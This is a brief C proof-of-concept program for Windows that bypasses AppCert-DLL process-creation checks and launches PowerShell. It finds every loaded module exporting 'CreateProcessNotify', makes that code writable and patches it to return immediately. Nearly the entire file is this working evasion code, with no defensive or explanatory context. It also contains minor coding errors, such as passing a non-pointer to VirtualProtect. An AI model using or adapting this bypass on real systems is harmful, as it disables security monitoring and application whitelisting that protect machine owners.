#include<windows.h>
#include<stdio.h>
#include<psapi.h>
void fuckup();
int WinMainCRTStartup()
{
        printf("executing powershell.exe normally using winexec");
        WinExec("powershell.exe",1);
        fuckup();
        printf("\n\nexecuting powershell.exe abnormally after messing appcert using winexec");
        WinExec("powershell.exe",1);
        Sleep(-1);
}
void fuckup()
{
        HMODULE l_Dlls[100];
        DWORD cbNeeded,i,dwOldProtection,dwOldProtection2;
        DWORD *CPN;
        if( EnumProcessModules(GetCurrentProcess(), l_Dlls, 400, &cbNeeded))
        for ( i = 0; i < (cbNeeded / 4); i++ )
        {      
                        CPN = (PDWORD)GetProcAddress(l_Dlls[i],"CreateProcessNotify");
                        if(CPN)
                        {
                                VirtualProtect((LPVOID)CPN,0x4,0x40,&dwOldProtection);
                                *CPN = 0x900008c2;
                                VirtualProtect((LPVOID)CPN,0x4,dwOldProtection,dwOldProtection2);
                        }
        }
}
